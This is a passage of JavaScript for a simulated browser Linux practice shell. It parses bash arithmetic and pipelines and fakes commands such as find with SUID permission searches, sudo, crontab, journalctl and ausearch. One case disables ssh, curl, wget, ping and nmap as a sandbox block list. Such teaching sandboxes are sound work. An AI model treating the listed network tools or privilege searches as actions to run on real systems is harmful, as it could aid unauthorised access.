    if ((m = /^([A-Za-z_]\w*)\s*([+\-*/%]?)=(?!=)\s*(.+)$/.exec(ex))) { var cur = parseInt(this.vars[m[1]] || '0', 10) || 0, val = this.arith(m[3]); var r0 = m[2] === '+' ? cur + val : m[2] === '-' ? cur - val : m[2] === '*' ? cur * val : m[2] === '/' ? Math.trunc(cur / val) : m[2] === '%' ? cur % val : val; this.vars[m[1]] = String(r0); return r0; }
    var t = ex.match(/\d+|[A-Za-z_]\w*|\$\{?\w+\}?|<=|>=|==|!=|&&|\|\||[-+*/%()<>!]/g) || [], p = 0;
    function peek() { return t[p]; }
    function prim() {
      var x = t[p++];
      if (x === '(') { var v = or(); p++; return v; }
      if (x === '-') return -prim(); if (x === '!') return prim() ? 0 : 1;
      if (/^\d+$/.test(x)) return +x;
      if (x && /^\$/.test(x)) x = x.replace(/[${}]/g, '');
      if (x) return parseInt(self.getVar(x), 10) || 0;
      throw Object.assign(new Error('bash: arithmetic syntax error'), { sh: true });
    }
    function mul() { var v = prim(); while (['*', '/', '%'].indexOf(peek()) > -1) { var o = t[p++], r = prim(); if ((o === '/' || o === '%') && !r) throw Object.assign(new Error('bash: division by 0'), { sh: true }); v = o === '*' ? v * r : o === '/' ? Math.trunc(v / r) : v % r; } return v; }
    function add() { var v = mul(); while (peek() === '+' || peek() === '-') { var o = t[p++], r = mul(); v = o === '+' ? v + r : v - r; } return v; }
    function cmp() { var v = add(); while (['<', '>', '<=', '>=', '==', '!='].indexOf(peek()) > -1) { var o = t[p++], r = add(); v = (o === '<' ? v < r : o === '>' ? v > r : o === '<=' ? v <= r : o === '>=' ? v >= r : o === '==' ? v === r : v !== r) ? 1 : 0; } return v; }
    function and() { var v = cmp(); while (peek() === '&&') { p++; var r = cmp(); v = v && r ? 1 : 0; } return v; }
    function or() { var v = and(); while (peek() === '||') { p++; var r = and(); v = v || r ? 1 : 0; } return v; }
    return or();
  };
  Shell.prototype.fail = function (code) { throw Object.assign(new Error(''), { sh: true, silent: true, code: code || 1 }); };

  Shell.prototype.pipeline = function (toks) {
    var stages = [[]], redir = null, inFile = null, noErr = false, toErr = false, self = this;
    for (var i = 0; i < toks.length; i++) {
      var t = toks[i];
      if (t.op === '|') stages.push([]);
      else if (t.op === '>' || t.op === '>>') { redir = { file: toks[i + 1], app: t.op === '>>' }; i++; }
      else if (t.op === '<') { inFile = toks[i + 1]; i++; }
      else if (t.op === '2>') { noErr = true; i++; }
      else if (t.op === '>&2') toErr = true;
      else if (t.op === '2>&1' || t.op === '&') { /* merge or background: ignore */ }
      else stages[stages.length - 1].push(t);
    }
    var data = null, dirs = null, code = 0;
    this.stream = stages.length === 1 && !redir && !this.cap;
    try {
      if (redir && (typeof redir.file !== 'string' || !redir.file)) this.err('bash: syntax error near unexpected token `newline\'');
      if (inFile != null) data = this.readFile('bash', PH(this.expand(inFile)));
      stages.forEach(function (raw, k) {
        if (!raw.length) self.err('bash: syntax error near unexpected token `|\'');
        var asg = 0;
        while (asg < raw.length && /^[A-Za-z_]\w*=/.test(raw[asg])) asg++;
        raw.slice(0, asg).forEach(function (a) { var e1 = a.indexOf('='); self.vars[a.slice(0, e1)] = PH(self.expand(a.slice(e1 + 1))); });
        if (asg === raw.length) { data = ''; return; }
        var argv = [];
        raw.slice(asg).forEach(function (a) { self.globs(self.expand(a)).forEach(function (x) { argv.push(PH(x)); }); });
        if (!argv.length) { data = ''; return; }
        var r = self.exec(argv, data);
        data = r == null ? '' : typeof r === 'object' ? r.text : r;
        dirs = typeof r === 'object' && r ? r.dirs : null;
        if (k === 0) self.last.argv = argv;
      });
      if (toErr && data) { this.print(data.replace(/\n$/, ''), 'er'); data = ''; }
      if (redir) { var rf = PH(this.expand(redir.file)); if (rf !== '/dev/null') this.writeFile('bash', rf, data && !/\n$/.test(data) ? data + '\n' : data, redir.app); data = ''; }
    } catch (e) {
      if (!e.sh) throw e;
      if (e.exitSig || e.retSig) throw e;
      if (!e.silent && !noErr) this.print(e.message, 'er');
      code = e.code || 1; data = e.out || '';
    }
    this.stream = false;
    if (this.errQ.length) { if (!noErr) this.errQ.forEach(function (x) { self.print(x, 'er'); }); this.errQ = []; }
    if (data) this.emit(data.replace(/\n$/, ''), dirs);
    return code;
  };

  Shell.prototype.exec = function (argv, stdin) {
    var self = this, cmd = argv[0], args = argv.slice(1);
    var flags = function (allowed) { var f = {}, rest = []; args.forEach(function (a) { if (/^-[a-zA-Z]+$/.test(a)) a.slice(1).split('').forEach(function (c) { f[c] = true; }); else rest.push(a); }); return { f: f, r: rest }; };
    var input = function (files, name) { return files.length ? files.map(function (p) { return self.readFile(name, p); }).join('') : (stdin == null ? '' : stdin); };
    var lines = function (s) { var l = s.split('\n'); if (l[l.length - 1] === '') l.pop(); return l; };
    var numOpt = function (def) { var n = def, rest = []; for (var i = 0; i < args.length; i++) { if (args[i] === '-n') { n = +args[++i]; } else if (/^-\d+$/.test(args[i])) n = +args[i].slice(1); else rest.push(args[i]); } return { n: n, r: rest }; };
    switch (cmd) {
      case 'help': return 'Practice shell commands:\n  pwd ls cd cat head tail less wc grep sort uniq cut awk find file\n  mkdir touch cp mv rm rmdir echo chmod chown stat\n  whoami id groups hostname uname date uptime ps df free ip ss history clear\n  sudo man which answer\n  bash scripting: variables, $(cmd), $((math)), if, for, while read, functions, [ ], test, printf, read, seq\n  systemctl crontab journalctl last ausearch auditctl sha256sum tar\nPipes (|), redirects (>, >>, <, 2>/dev/null), && || and ; work. Type man <command> for a short description.';
      case 'clear': this.out.innerHTML = ''; return '';
      case 'pwd': return this.cwd;
      case 'whoami': return this.user;
      case 'hostname': return 'cwm-lab';
      case 'id': return this.user === 'root' ? 'uid=0(root) gid=0(root) groups=0(root)' : 'uid=1000(student) gid=1000(student) groups=1000(student),4(adm),27(sudo)';
      case 'groups': return this.user === 'root' ? 'root' : 'student adm sudo';
      case 'uname': return args.indexOf('-a') > -1 ? 'Linux cwm-lab 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux' : args.indexOf('-r') > -1 ? '6.8.0-45-generic' : 'Linux';
      case 'date': { var dd = new Date(), z = function (x) { return ('0' + x).slice(-2); }; if (args[0] && args[0][0] === '+') return args[0].slice(1).replace(/%F/g, dd.getFullYear() + '-' + z(dd.getMonth() + 1) + '-' + z(dd.getDate())).replace(/%Y/g, dd.getFullYear()).replace(/%m/g, z(dd.getMonth() + 1)).replace(/%d/g, z(dd.getDate())).replace(/%H/g, z(dd.getHours())).replace(/%M/g, z(dd.getMinutes())).replace(/%S/g, z(dd.getSeconds())).replace(/%s/g, Math.floor(dd / 1000)); return dd.toString().replace(/ GMT.*$/, ''); }
      case 'uptime': return ' 09:41:07 up 1:39,  1 user,  load average: 0.08, 0.05, 0.01';
      case 'ps': return PS;
      case 'top': case 'htop': return 'top is interactive and needs a real terminal. Try ps aux here.';
      case 'df': return 'Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda2        25G  7.9G   16G  34% /\ntmpfs           393M  1.2M  392M   1% /run';
      case 'free': return '               total        used        free      shared  buff/cache   available\nMem:           3.8Gi       1.1Gi       2.2Gi        12Mi       790Mi       2.7Gi\nSwap:          2.0Gi          0B       2.0Gi';
      case 'ip': return '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic enp0s3\n3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 192.168.56.101/24 brd 192.168.56.255 scope global enp0s8';
      case 'ss': case 'netstat': return 'Netid State  Local Address:Port  Peer Address:Port\ntcp   LISTEN 0.0.0.0:22          0.0.0.0:*\ntcp   LISTEN 0.0.0.0:80          0.0.0.0:*\nudp   UNCONN 127.0.0.53:53       0.0.0.0:*';
      case 'history': return this.hist.map(function (h, i) { return String(i + 1).padStart(5) + '  ' + h; }).join('\n');
      case 'echo': { var ea = args.slice(), ee = false; while (/^-[neE]+$/.test(ea[0] || '')) { if (ea[0].indexOf('e') > -1) ee = true; ea.shift(); } var et = ea.join(' '); if (ee) et = et.replace(/\\n/g, '\n').replace(/\\t/g, '\t'); return { text: et, dirs: null }; }
      case 'man': return args[0] ? (MAN[args[0]] || 'No manual entry for ' + args[0] + ' in this practice shell.') : 'What manual page do you want? Try man grep';
      case 'which': return args.map(function (a) { return MAN[a] || ['bash', 'ls', 'cat'].indexOf(a) > -1 ? '/usr/bin/' + a : ''; }).filter(Boolean).join('\n');
      case 'nano': case 'vim': case 'vi': return 'Editors need a real terminal. Here, write files with echo "text" > file and add lines with >>.';
      case 'logout': return 'This practice shell stays open. Use the Reset button to start fresh.';
      case 'apt': case 'apt-get': return this.user === 'root' ? 'Package installs need the internet, so they are disabled in this practice shell. Do this step on your own VM.' : 'E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Are you root? Try sudo.';
      case 'ssh': case 'curl': case 'wget': case 'ping': case 'nmap': return cmd + ': network commands are off in this browser shell. Practise them on your own lab VMs.';
      case 'sudo': {
        if (!args.length) return 'usage: sudo <command>';
        if (args[0] === '-i' || args[0] === 'su') { this.user = 'root'; this.cwd = '/root'; return '[sudo] practice shell: password step skipped.\nYou are now root. Be careful. Type sudo -k to go back to student.'; }
        if (args[0] === '-k') { this.user = 'student'; this.cwd = this.home; return ''; }
        var prev = this.user; this.user = 'root';
        try { var r = this.exec(args, stdin); } finally { this.user = prev; }
        return r;
      }
      case 'su': return 'su: Authentication failure (practice shell). Use sudo for one command.';
      case 'cd': {
        var to = this.abs(args[0] || '~'), n = this.node(to);
        if (!n) this.err('bash: cd: ' + args[0] + ': No such file or directory');
        if (n.t !== 'd') this.err('bash: cd: ' + args[0] + ': Not a directory');
        if (!this.can(n, 1)) this.err('bash: cd: ' + args[0] + ': Permission denied');
        this.cwd = to; return '';
      }
      case 'ls': case 'll': {
        var o = flags(), paths = o.r.length ? o.r : ['.'], outp = [], dl = [];
        if (cmd === 'll') { o.f.l = true; o.f.a = true; }
        paths.forEach(function (p) {
          var a = self.abs(p), n = self.node(a);
          if (!n) self.err("ls: cannot access '" + p + "': No such file or directory");
          if (n.t !== 'd') { outp.push(o.f.l ? row(p, n) : p); return; }
          if (!self.can(n, 4)) self.err("ls: cannot open directory '" + p + "': Permission denied");
          var names = Object.keys(n.ch).sort().filter(function (k) { return o.f.a || k[0] !== '.'; });
          if (o.f.a) names = ['.', '..'].concat(names);
          if (paths.length > 1) outp.push(p + ':');
          if (o.f.l) { outp.push('total ' + names.length * 4); names.forEach(function (k) { var c = k === '.' ? n : k === '..' ? (self.node(self.abs(p + '/..')) || n) : n.ch[k]; if (c.t === 'd') dl.push(k); outp.push(row(k, c)); }); }
          else { names.forEach(function (k) { var c = k === '.' || k === '..' ? n : n.ch[k]; if (c.t === 'd') dl.push(k); }); outp.push(names.join('  ')); }
        });
        function row(name, n) { var s = size(n); return mstr(n) + ' ' + (n.t === 'd' ? 2 : 1) + ' ' + n.o.padEnd(8) + ' ' + n.g.padEnd(8) + ' ' + (o.f.h && s >= 1024 ? (s / 1024).toFixed(1) + 'K' : String(s)).padStart(5) + ' ' + DATE + ' ' + name; }
        return { text: outp.join('\n'), dirs: dl };
      }
      case 'cat': case 'less': case 'more': return input(args.filter(function (a) { return a[0] !== '-'; }), cmd);
      case 'head': case 'tail': { var h = numOpt(10), L = lines(input(h.r, cmd)); return (cmd === 'head' ? L.slice(0, h.n) : L.slice(Math.max(0, L.length - h.n))).join('\n'); }
      case 'wc': {
        var w = flags(), txt = input(w.r, 'wc'), nl = (txt.match(/\n/g) || []).length + (txt && txt.slice(-1) !== '\n' ? 1 : 0), nw = (txt.match(/\S+/g) || []).length, nb = txt.length;
        var parts = w.f.l || w.f.w || w.f.c ? [w.f.l ? nl : null, w.f.w ? nw : null, w.f.c ? nb : null].filter(function (x) { return x !== null; }) : [nl, nw, nb];
        return parts.join(' ') + (w.r.length ? ' ' + w.r.join(' ') : '');
      }
      case 'grep': {
        var gf = flags(), pat = gf.r[0], files = gf.r.slice(1);
        if (pat == null) this.err('Usage: grep [OPTION]... PATTERNS [FILE]...');
        var re; try { re = new RegExp(pat, gf.f.i ? 'i' : ''); } catch (e) { re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), gf.f.i ? 'i' : ''); }
        var res = [];
        var srcs = files.length ? files.map(function (f) { return [f, self.readFile('grep', f)]; }) : [['', stdin || '']];
        srcs.forEach(function (s) { lines(s[1]).forEach(function (l, i) {
          if (re.test(l) === !!gf.f.v) return;
          var pre = (files.length > 1 ? s[0] + ':' : '') + (gf.f.n ? (i + 1) + ':' : '');
          if (gf.f.o && !gf.f.v) { var g = new RegExp(re.source, re.flags + 'g'), mt; while ((mt = g.exec(l)) && mt[0]) res.push(pre + mt[0]); }
          else res.push(pre + l);
        }); });
        if (gf.f.q) { if (!res.length) this.fail(1); return ''; }
        if (!res.length && !gf.f.c) this.fail(1);
        if (gf.f.c && !res.length) throw Object.assign(new Error(''), { sh: true, silent: true, code: 1, out: '0' });
        return gf.f.c ? String(res.length) : res.join('\n');
      }
      case 'sort': { var sf = flags(), SL = lines(input(sf.r, 'sort')); SL.sort(sf.f.n ? function (a, b) { return parseFloat(a) - parseFloat(b); } : undefined); if (sf.f.r) SL.reverse(); if (sf.f.u) SL = SL.filter(function (x, i) { return SL.indexOf(x) === i; }); return SL.join('\n'); }
      case 'uniq': {
        var uf = flags(), UL = lines(input(uf.r, 'uniq')), out2 = [], prev2 = null, cnt = 0;
        UL.concat([null]).forEach(function (l) { if (l === prev2) { cnt++; return; } if (prev2 !== null) out2.push(uf.f.c ? String(cnt).padStart(7) + ' ' + prev2 : prev2); prev2 = l; cnt = 1; });
        return out2.join('\n');
      }
      case 'cut': {
        var d = '\t', fl = null, rest2 = [];
        for (var i = 0; i < args.length; i++) { var a = args[i]; if (a === '-d') d = args[++i]; else if (/^-d./.test(a)) d = a.slice(2); else if (a === '-f') fl = args[++i]; else if (/^-f/.test(a)) fl = a.slice(2); else rest2.push(a); }
        if (!fl) this.err('cut: you must specify a list of fields');
        var fs = fl.split(',').map(Number);
        return lines(input(rest2, 'cut')).map(function (l) { var p = l.split(d); return fs.map(function (f) { return p[f - 1] || ''; }).join(d); }).join('\n');
      }
      case 'awk': {
        var sep = null, prog = null, af = [];
        for (var j = 0; j < args.length; j++) { if (args[j] === '-F') sep = args[++j]; else if (/^-F./.test(args[j])) sep = args[j].slice(2); else if (prog === null) prog = args[j]; else af.push(args[j]); }
        var m = /^\{\s*print\s+((?:\$\d+|NF|\$NF|\$\(NF-\d+\))(?:\s*,\s*(?:\$\d+|\$NF|\$\(NF-\d+\)))*)\s*\}$/.exec(prog || '');
        if (!m) this.err("awk: this practice shell only supports print with fields, like awk '{print $1}' or awk '{print $(NF-3)}'");
        var cols = m[1].split(',').map(function (s) { return s.trim(); });
        return lines(input(af, 'awk')).map(function (l) { var p = sep ? l.split(sep) : l.trim().split(/\s+/); return cols.map(function (c) { var k = /^\$\(NF-(\d+)\)$/.exec(c); if (k) return p[p.length - 1 - +k[1]] || ''; return c === '$NF' ? p[p.length - 1] : c === 'NF' ? String(p.length) : (+c.slice(1) === 0 ? l : p[+c.slice(1) - 1] || ''); }).join(' '); }).join('\n');
      }
      case 'find': {
        var start = args[0] && args[0][0] !== '-' ? args[0] : '.', name = null, type = null, res2 = [];
        var perm = null, fuser = null, mtime = null, maxd = 99;
        for (var k = 0; k < args.length; k++) { if (args[k] === '-name' || args[k] === '-iname') name = args[++k]; else if (args[k] === '-type') type = args[++k]; else if (args[k] === '-perm') perm = args[++k]; else if (args[k] === '-user') fuser = args[++k]; else if (args[k] === '-mtime') mtime = args[++k]; else if (args[k] === '-maxdepth') maxd = +args[++k]; }
        var permOk = function (n) { if (!perm) return true; var pm = /^[-\/]?(?:u=s|4000)$/.test(perm) ? 2048 : /^[-\/]?(?:g=s|2000)$/.test(perm) ? 1024 : /^[-\/]?(?:o\+w|o=w|0*2)$/.test(perm) ? 2 : parseInt(perm.replace(/^[-\/]/, ''), 8); return perm[0] === '-' || perm[0] === '/' ? (perm[0] === '-' ? (n.m & pm) === pm : !!(n.m & pm)) : (n.m & 4095) === pm; };
        var mOk = function (n) { if (mtime == null) return true; var age = n.age == null ? 30 : n.age, v = +mtime.replace(/^[-+]/, ''); return mtime[0] === '-' ? age < v : mtime[0] === '+' ? age > v : age === v; };
        var rx = name ? new RegExp('^' + name.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$', 'i') : null;
        var root = this.node(this.abs(start)); if (!root) this.err("find: '" + start + "': No such file or directory");
        var errs = [];
        (function walk(n, p, nm, dep) {
          if ((!rx || rx.test(nm)) && (!type || (type === 'd') === (n.t === 'd')) && permOk(n) && (!fuser || n.o === fuser) && mOk(n)) res2.push(p);
          if (n.t === 'd' && dep < maxd) { if (!self.can(n, 4)) { errs.push("find: '" + p + "': Permission denied"); return; } Object.keys(n.ch).sort().forEach(function (c) { walk(n.ch[c], (p === '/' ? '' : p) + '/' + c, c, dep + 1); }); }
        })(root, start, start.split('/').pop() || '/', 0);
        if (errs.length) { errs.forEach(function (x) { self.errQ.push(x); }); }
        return res2.join('\n');
      }
      case 'file': return args.map(function (p) { var n = self.node(self.abs(p)); if (!n) return p + ': cannot open'; if (n.t === 'd') return p + ': directory'; if (/^#!\/bin\/(ba)?sh/.test(n.c)) return p + ': Bourne-Again shell script, ASCII text executable'; if (n.c === 'ELF binary') return p + ': ELF 64-bit LSB pie executable, x86-64'; return p + ': ASCII text'; }).join('\n');
      case 'stat': return args.map(function (p) { var n = self.node(self.abs(p)); if (!n) self.err("stat: cannot statx '" + p + "': No such file or directory"); return '  File: ' + p + '\n  Size: ' + size(n) + '\nAccess: (0' + (n.m & 511).toString(8) + '/' + mstr(n) + ')  Uid: ' + n.o + '  Gid: ' + n.g; }).join('\n');
      case 'mkdir': {
        var mf = flags();
        mf.r.forEach(function (p) {
          var a = self.abs(p);
          if (self.node(a)) { if (!mf.f.p) self.err("mkdir: cannot create directory '" + p + "': File exists"); return; }
          var segs = a.split('/').slice(1), cur = '';
          segs.forEach(function (s, i) {
            cur += '/' + s; var ex = self.node(cur);
            if (ex) return;
            if (i < segs.length - 1 && !mf.f.p) self.err("mkdir: cannot create directory '" + p + "': No such file or directory");
            var pr = self.parent(cur); if (!self.can(pr.dir, 2)) self.err("mkdir: cannot create directory '" + p + "': Permission denied");
            pr.dir.ch[pr.name] = { t: 'd', ch: {}, m: 509, o: self.user, g: self.user };
          });
        });
        return '';
      }
      case 'touch': args.forEach(function (p) { if (!self.node(self.abs(p))) self.writeFile('touch', p, '', false); }); return '';
      case 'rm': case 'rmdir': {
        var rf = flags();
        rf.r.forEach(function (p) {
          var a = self.abs(p), n = self.node(a);
          if (!n) { if (!rf.f.f) self.err("rm: cannot remove '" + p + "': No such file or directory"); return; }
          if (a === '/' || a === self.home) self.err("rm: refusing to remove '" + p + "' in the practice shell");
          if (n.t === 'd' && cmd === 'rm' && !rf.f.r) self.err("rm: cannot remove '" + p + "': Is a directory");
          if (n.t === 'd' && cmd === 'rmdir' && Object.keys(n.ch).length) self.err("rmdir: failed to remove '" + p + "': Directory not empty");
          var pr = self.parent(a); if (!self.can(pr.dir, 2)) self.err("rm: cannot remove '" + p + "': Permission denied");
          delete pr.dir.ch[pr.name];
        });
        return '';
      }
      case 'cp': case 'mv': {
        var cf = flags(); if (cf.r.length < 2) this.err(cmd + ': missing destination file operand');
        var dst = cf.r[cf.r.length - 1], dn = this.node(this.abs(dst));
        cf.r.slice(0, -1).forEach(function (s) {
          var sa = self.abs(s), sn = self.node(sa);
          if (!sn) self.err(cmd + ": cannot stat '" + s + "': No such file or directory");
          if (sn.t === 'd' && cmd === 'cp' && !cf.f.r) self.err("cp: -r not specified; omitting directory '" + s + "'");
          if (cmd === 'cp' && sn.t === 'f' && !self.can(sn, 4)) self.err("cp: cannot open '" + s + "' for reading: Permission denied");
          var target = dn && dn.t === 'd' ? self.abs(dst) + '/' + sa.split('/').pop() : self.abs(dst);
          var pr = self.parent(target); if (!pr.dir || !self.can(pr.dir, 2)) self.err(cmd + ": cannot create '" + dst + "': Permission denied");
          var copy = JSON.parse(JSON.stringify(sn)); if (cmd === 'cp') { copy.o = self.user; copy.g = self.user; }
          pr.dir.ch[pr.name] = copy;
          if (cmd === 'mv') { var sp = self.parent(sa); delete sp.dir.ch[sp.name]; }
        });
        return '';
      }
      case 'chmod': {
        var mode = args[0], targets = args.slice(1);
        if (!mode || !targets.length) this.err('chmod: missing operand');
        targets.forEach(function (p) {
          var n = self.node(self.abs(p)); if (!n) self.err("chmod: cannot access '" + p + "': No such file or directory");
          if (self.user !== 'root' && n.o !== self.user) self.err("chmod: changing permissions of '" + p + "': Operation not permitted");
          if (/^[0-7]{3,4}$/.test(mode)) { n.m = parseInt(mode, 8); return; }
          mode.split(',').forEach(function (part) {
            var mm = /^([ugoa]*)([+\-=])([rwxt]*)$/.exec(part); if (!mm) self.err("chmod: invalid mode: '" + mode + "'");
            var who = mm[1] || 'a', bits = 0;
            mm[3].split('').forEach(function (c) { var v = c === 'r' ? 4 : c === 'w' ? 2 : c === 'x' ? 1 : 0; if (c === 't') bits |= 512; ['u', 'g', 'o'].forEach(function (w, i) { if (who.indexOf(w) > -1 || who.indexOf('a') > -1) bits |= v << (6 - 3 * i); }); });
            if (mm[2] === '+') n.m |= bits; else if (mm[2] === '-') n.m &= ~bits; else { var mask = 0; ['u', 'g', 'o'].forEach(function (w, i) { if (who.indexOf(w) > -1 || who.indexOf('a') > -1) mask |= 7 << (6 - 3 * i); }); n.m = (n.m & ~mask) | bits; }
          });
        });
        return '';
      }
      case 'chown': if (this.user !== 'root') this.err("chown: changing ownership of '" + (args[1] || '') + "': Operation not permitted"); args.slice(1).forEach(function (p) { var n = self.node(self.abs(p)); if (n) { var og = args[0].split(':'); n.o = og[0]; if (og[1]) n.g = og[1]; } }); return '';
      case 'answer': case 'submit': return this.answer(args.join(' '));
      case 'bash': case 'sh': if (args[0] === '-n') { var sn0 = this.readFile('bash', args[1] || ''); parseBlock(splitStmts(sn0), 0, []); return ''; } return this.script(args[0], true, args.slice(1));
      case 'source': case '.': { var srcn = this.readFile('bash', args[0] || ''); this.execText(srcn); return ''; }
      case 'test': case '[': case '[[': {
        var ta = args.slice();
        if (cmd !== 'test') { var close = cmd === '[' ? ']' : ']]'; if (ta[ta.length - 1] !== close) this.err('bash: ' + cmd + ": missing `" + close + "'"); ta.pop(); }
        if (!this.testExpr(ta)) this.fail(1); return '';
      }
      case 'true': case ':': return '';
      case 'false': this.fail(1); return '';
      case 'exit': if (this.depth > 0) throw Object.assign(new Error(''), { sh: true, exitSig: true, code: parseInt(args[0], 10) || 0 }); return 'This practice shell stays open. Use the Reset button to start fresh.';
      case 'return': throw Object.assign(new Error(''), { sh: true, retSig: true, code: parseInt(args[0], 10) || 0 });
      case 'local': case 'export': case 'readonly': case 'declare': args.forEach(function (a) { var e1 = a.indexOf('='); if (e1 > 0) self.vars[a.slice(0, e1)] = a.slice(e1 + 1); else if (self.vars[a] == null) self.vars[a] = ''; }); return '';
      case 'set': return '';
      case 'unset': args.forEach(function (a) { delete self.vars[a]; }); return '';
      case 'read': {
        var rn = args.filter(function (a) { return a[0] !== '-'; });
        if (!this.readQ || !this.readQ.length) { if (!this.readQ) this.err('read: there is no keyboard input in this practice shell. Use it as: while read -r line; do ...; done < file'); this.fail(1); }
        var rl = this.readQ.shift();
        if (rn.length <= 1) this.vars[rn[0] || 'REPLY'] = rl;
        else { var parts = rl.trim().split(/\s+/); rn.forEach(function (v, i) { self.vars[v] = i === rn.length - 1 ? parts.slice(i).join(' ') : (parts[i] || ''); }); }
        return '';
      }
      case 'printf': {
        if (!args.length) this.err('printf: usage: printf format [arguments]');
        var fmt = args[0].replace(/\\n/g, '\n').replace(/\\t/g, '\t'), pa = args.slice(1), res3 = '', guard = 0;
        do { var used = 0; res3 += fmt.replace(/%(-?)(\d*)([sd%])/g, function (m0, left, w, ty) { if (ty === '%') return '%'; var v = pa[used++]; v = v == null ? (ty === 'd' ? '0' : '') : ty === 'd' ? String(parseInt(v, 10) || 0) : v; var wd = +w || 0; return left ? v.padEnd(wd) : v.padStart(wd); }); pa = pa.slice(used); } while (pa.length && used && ++guard < 50);
        return { text: res3.replace(/\n$/, ''), dirs: null };
      }
      case 'seq': { var sa1 = args.length > 1 ? +args[0] : 1, sb = +args[args.length - 1], sq = []; for (var si = sa1; si <= sb && sq.length < 500; si++) sq.push(si); return sq.join('\n'); }
      case 'basename': return (args[0] || '').replace(/\/+$/, '').split('/').pop().replace(args[1] ? new RegExp(args[1].replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '$') : /$^/, '');
      case 'dirname': { var dn0 = (args[0] || '.').replace(/\/+$/, ''); var di = dn0.lastIndexOf('/'); return di < 0 ? '.' : di === 0 ? '/' : dn0.slice(0, di); }
      case 'sleep': return '';
      case 'tr': { var t1 = args[0] === '-d' ? null : args[0], t2 = args[0] === '-d' ? args[1] : args[1], tin = stdin || ''; var exp = function (x) { return (x || '').replace(/(\w)-(\w)/g, function (m0, a, b) { var o = ''; for (var c = a.charCodeAt(0); c <= b.charCodeAt(0); c++) o += String.fromCharCode(c); return o; }); }; if (t1 == null) { var del = exp(t2); return tin.split('').filter(function (c) { return del.indexOf(c) < 0; }).join(''); } var f1 = exp(t1), f2 = exp(t2); return tin.split('').map(function (c) { var i = f1.indexOf(c); return i < 0 ? c : (f2[i] || f2[f2.length - 1]); }).join(''); }
      case 'sha256sum': {
        var hs = args.length ? args : ['-'];
        return hs.map(function (p) { var c = p === '-' ? (stdin || '') : self.readFile('sha256sum', p); return sha256(c) + '  ' + p; }).join('\n');
      }
      case 'tar': {
        var tf = args[0] || '', tfi = args.indexOf('-f'), arch = tfi > -1 ? args[tfi + 1] : /f/.test(tf) ? args[1] : null;
        if (!arch) this.err('tar: you must say which archive file to use, for example tar -czf backup.tar.gz notes.txt');
        var srcs2 = args.slice((tfi > -1 ? tfi : 1) + 1).filter(function (a) { return a[0] !== '-'; });
        if (/t/.test(tf)) return this.readFile('tar', arch).split('\n').filter(function (l) { return l && l[0] !== '#'; }).join('\n');
        if (!/c/.test(tf)) return 'tar: this practice shell only creates (-c) and lists (-t) archives.';
        var listing = []; srcs2.forEach(function (sp) { var nn = self.node(self.abs(sp)); if (!nn) self.err('tar: ' + sp + ': Cannot stat: No such file or directory'); (function walk(n0, pp) { listing.push(pp + (n0.t === 'd' ? '/' : '')); if (n0.t === 'd') Object.keys(n0.ch).sort().forEach(function (c) { walk(n0.ch[c], pp + '/' + c); }); })(nn, sp.replace(/\/$/, '')); });
        this.writeFile('tar', arch, '# simulated tar archive (lists its contents)\n' + listing.join('\n') + '\n', false);
        return args.indexOf('-v') > -1 || /v/.test(tf) ? listing.join('\n') : '';
      }
      case 'crontab': {
        var cu = this.user, ci = args.indexOf('-u'); if (ci > -1) { if (this.user !== 'root') this.err('crontab: must be privileged to use -u'); cu = args[ci + 1]; }
        if (args.indexOf('-e') > -1) return 'Editors need a real terminal. On your VM run crontab -e. Here, read jobs with crontab -l.';
        var cn = this.node('/var/spool/cron/crontabs/' + cu);
        if (!cn) return 'no crontab for ' + cu;
        return cn.c.replace(/\n$/, '');
      }
      case 'systemctl': return this.systemctl(args);
      case 'journalctl': {
        var jn = this.node('/var/log/journal.txt'); if (!jn) return '-- No entries --';
        if (this.user !== 'root' && ['adm', 'sudo'].indexOf(jn.g) < 0 && jn.g !== 'systemd-journal') this.err('Hint: You are currently not seeing messages from other users and the system.');
        var JL = jn.c.split('\n').filter(Boolean), ju = null, jnum = null, jg = null;
        for (var jj = 0; jj < args.length; jj++) { if (args[jj] === '-u') ju = args[++jj]; else if (/^-u./.test(args[jj])) ju = args[jj].slice(2); else if (args[jj] === '-n') jnum = +args[++jj]; else if (args[jj] === '-g' || args[jj] === '--grep') jg = args[++jj]; }
        if (ju) { var un = ju.replace(/\.service$/, ''); var ue = un.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); JL = JL.filter(function (l) { return new RegExp('\\s' + ue + 'd?(\\[\\d+\\])?:').test(l) || new RegExp('\\s' + ue + '\\.service').test(l); }); }
        if (jg) JL = JL.filter(function (l) { return new RegExp(jg, 'i').test(l); });
        if (jnum) JL = JL.slice(-jnum);
        return JL.length ? JL.join('\n') : '-- No entries --';
      }
      case 'last': { var ln0 = this.node('/var/log/wtmp.txt'); return ln0 ? ln0.c.replace(/\n$/, '') + '\n\nwtmp begins Sat Nov 14 07:12:40 2026' : '\nwtmp begins Sat Nov 14 07:12:40 2026'; }
      case 'ausearch': {
        if (this.user !== 'root') this.err('Error opening /var/log/audit/audit.log (Permission denied)');
        var an = this.node('/var/log/audit/audit.log'); if (!an) return '<no matches>';
        var ak = args.indexOf('-k') > -1 ? args[args.indexOf('-k') + 1] : null, ax = args.indexOf('-x') > -1 ? args[args.indexOf('-x') + 1] : null;
        var hits = an.c.split('\n').filter(function (l) { return l && (!ak || l.indexOf('key="' + ak + '"') > -1) && (!ax || l.indexOf('exe="' + ax) > -1 || l.indexOf(ax) > -1); });
        return hits.length ? hits.map(function (l) { return '----\n' + l; }).join('\n') : '<no matches>';
      }
      case 'auditctl': {
        if (this.user !== 'root') this.err('You must be root to run this program.');
